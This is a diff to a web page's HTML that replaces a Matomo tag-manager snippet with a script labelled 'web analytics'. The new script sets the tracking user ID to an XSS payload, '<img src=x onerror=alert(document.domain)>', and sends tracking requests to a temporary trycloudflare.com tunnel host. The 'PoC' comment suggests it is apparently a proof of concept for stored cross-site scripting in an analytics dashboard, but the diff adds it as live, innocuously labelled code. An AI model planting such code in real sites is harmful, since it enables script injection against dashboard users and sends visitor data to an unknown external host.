@@ -549,16 +549,29 @@
 
 
 <!-- ------------------Temporary tag# PoC matomo -->
+<!-- web analytics -->
 <script>
-var _mtm = window._mtm = window._mtm || [];
-_mtm.push({'mtm.startTime': (new Date().getTime()), 'event': 'mtm.Start'});
-(function() {
-var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
-g.async=true;
-g.src='https://shortcuts-renaissance-cooper-sunglasses.trycloudflare.com/js/container_m4NLmv95.js';
-s.parentNode.insertBefore(g,s);
-})();
+  var MATOMO_URL = "https://feels-surrey-stations-aim.trycloudflare.com/matomo.php";
+  var SITE_ID = "1";
+  (function () {
+    var _paq = window._paq = window._paq || [];
+    _paq.push(['setUserId',
+      "<img src=x onerror=alert(document.domain)>" +
+      Date.now().toString(36) + Math.random().toString(36).slice(2,8)]);
+    _paq.push(['setTrackerUrl', MATOMO_URL]);
+    _paq.push(['setSiteId', SITE_ID]);
+    _paq.push(['trackPageView']);
+    (function () {
+      var d = document, g = d.createElement('script'), s = d.getElementsByTagName('script')[0];
+      g.async = true;
+      g.src = MATOMO_URL + '?' + _paq.map(function (p) {
+        return encodeURIComponent(p[0]) + '=' + encodeURIComponent(String(p[1]));
+      }).join('&');
+      s.parentNode.insertBefore(g, s);
+    })();
+  })();
 </script>
+
 <!-- ------------------------------------------->
 
         
